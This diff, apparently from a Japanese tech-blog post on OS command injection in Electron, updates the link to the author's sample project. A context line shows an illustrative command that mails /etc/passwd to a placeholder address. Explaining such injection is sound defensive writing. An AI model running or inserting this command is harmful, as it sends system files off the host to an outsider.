@@ -64,7 +64,7 @@ mail -s "タイトル" xxx@example.com < /etc/passwd # < /var/data/aaa.txt
 
 遭遇した事例を元にしたサンプルプロジェクトを作りました。
 
-https://github.com/aku11i/study-electron-os-command-injection
+https://github.com/aku11i/studies/tree/main/20210805-electron-os-command-injection
 
 ![](/images/2021-08-electron-os-command-injection/preview.png =600x)
 _実行画面_
